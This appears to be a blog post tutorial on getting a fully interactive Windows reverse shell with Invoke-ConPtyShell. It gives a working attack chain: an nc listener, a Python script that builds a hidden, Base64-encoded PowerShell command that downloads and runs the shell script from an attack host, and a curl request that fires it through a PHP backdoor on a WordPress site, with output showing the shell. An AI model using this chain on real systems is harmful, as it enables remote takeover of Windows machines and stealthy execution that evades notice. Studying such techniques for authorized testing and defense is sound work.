---
layout: post
title: "When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell"
---

Picture this. You're in a good workflow on a Windows target, you even added some command history with `rlwrap` for quality of life. Then it happens, you accidentally start a program in the foreground... You press `Ctrl + C` in your `nc` Windows shell one (1) time 😢

Enter [Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell), a fully interactive reverse shell for Windows. Gone are the days of accidental shell deaths. Grab your trusty Python HTTP server, `nc` listener, a good attitude, and follow me!

# Staging the File & Listener

Navigate to the above linked GitHub repository and download the `Invoke-ConPtyShell.ps1` PowerShell script onto your attack machine.

Host the file on your attack machine with `python3 -m http.server 80`.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ ls   
Invoke-ConPtyShell.ps1
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Setup your reverse shell listener on your attack machine with `stty raw -echo; (stty size; cat) | nc -lvnp 443` as specified by the GitHub repository's `README.md` file.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 443
listening on [any] 443 ...
```

# Encoding the Command

Take note of your attack machine's terminal size with `stty size`. This will output the number of rows and columns, respectively.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ stty size                                      
52 236
```

For reasons I still don't understand, attempting to use `echo` and piping the output to `base64` does not result in a properly encoded command. PowerShell will fail to interpret the Base64 string. This is where the following Python script comes into play.

```python
#!/usr/bin/python3
import base64
payload = 'IEX(New-Object System.Net.WebClient).DownloadString("http://<ATTACK-IP>/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell <ATTACK-IP> <ATTACK-PORT> -Rows <ROWS> -Cols <COLS>'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print("\033[1;37m[*] Encoded command: \033[1;00m\033[1;33m" + cmd + "\033[00m")
```

- `<ATTACK-IP>`: Your attack machine's IP address
- `<ATTACK-PORT>`: Your attack machine's `nc` reverse shell listener port (443 in this example).
- `<ROWS>`: Number of terminal rows
- `<COLS>`: Number of terminal columns

Once you've entered all IP, port, and terminal information, execute the script using `python3 conpty.py` to encode the PowerShell command.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 conpty.py          
[*] Encoded command: powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
```

# Execution

All that is left to do is copy the command and execute it via your target's RCE vulnerability. This example uses a PHP backdoor.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ curl -b "wordpress_d407..." "http://192.168.X.X/foo/bar-content/plugins/askimet/?cmd=powershell%20-nop%20-w%20hidden%20-e%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A..."
```

If you navigate back to the Python HTTP server terminal, you'll notice the target has downloaded the PowerShell script.

```
┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.X.X - - [08/Sep/2025 21:49:58] "GET /Invoke-ConPtyShell.ps1 HTTP/1.1" 200 -
```

Navigate to your reverse shell listener terminal and enjoy your fully interactive Windows reverse shell, `Ctrl + C` and all!

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\foo\htdocs\bar> whoami
bar\corpuser
PS C:\foo\htdocs\bar> ^C
PS C:\foo\htdocs\bar> ^C
PS C:\foo\htdocs\bar>
```